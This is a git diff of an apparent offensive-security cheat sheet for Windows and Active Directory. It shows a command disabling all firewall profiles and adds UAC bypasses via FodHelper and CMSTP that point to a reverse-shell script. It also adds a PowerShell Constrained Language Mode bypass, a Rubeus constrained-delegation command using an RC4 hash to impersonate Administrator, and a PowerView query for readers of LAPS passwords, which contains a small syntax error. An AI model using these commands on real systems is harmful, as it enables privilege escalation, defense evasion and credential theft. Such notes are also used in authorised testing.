@@ -48,9 +48,15 @@ get-netfirewallprofile -profile domain,public,private | format-table -property n
 Disableprofiles
 set-netfirewallprofile -profile domain,public,private -enabled false
 
-3.3 Fodhelper bypassUAC
+3.3 Bypass UAC with FodHelper.exe [https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/](https://pentestlab.blog/2017/06/07/uac-bypass-fodhelper/)
 
-- Spawn reverse shell (or execute payload) to bypass UAC. Please see fodhelper.ps1
+- Spawn reverse shell (or execute payload) to bypass UAC. Please see fodhelperBypass.ps1
+
+3.4 Bypass UAC with CMSTP [https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html](https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html)
+
+3.5 Bypass PowerShell Constrained Language Mode
+
+Please refer to CLMBypass.ps1. The script utilizes System.Management.Automation.PowerShell.Runspace to bypass CLM. Assembly compiled to .exe executable, but the script can be modified to be chained with AppLocker bypass scenarios.
 
 # 3 Persistence
 
@@ -112,6 +118,10 @@ In case lsass is running as a protected process, we can still use Skeleton Key b
 4.1 Rubeus Constained Delegation
 .\Rubeus.exe s4u /user:dbservice /domain:sub.domain.local /rc4:6f9e22a64970f32bd0d86fddadc8b8b5 /impersonateuser:"Administrator" /msdsspn:"time/ufc-dc1" /altservice:cifs /ptt
 
+4.2 LAPS passwords
+
+Get-NetOU -FullData | Get-ObjectAcl -ResolveGUIDs |
+Where-Object{($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object { $_ | Add-Member -NoteProperty 'IdentitySID' $(Convert-NameToSid. $_IdentityReference).SID; $_}
 
 # 5 Defense Evasion
 # 6 Credential Access
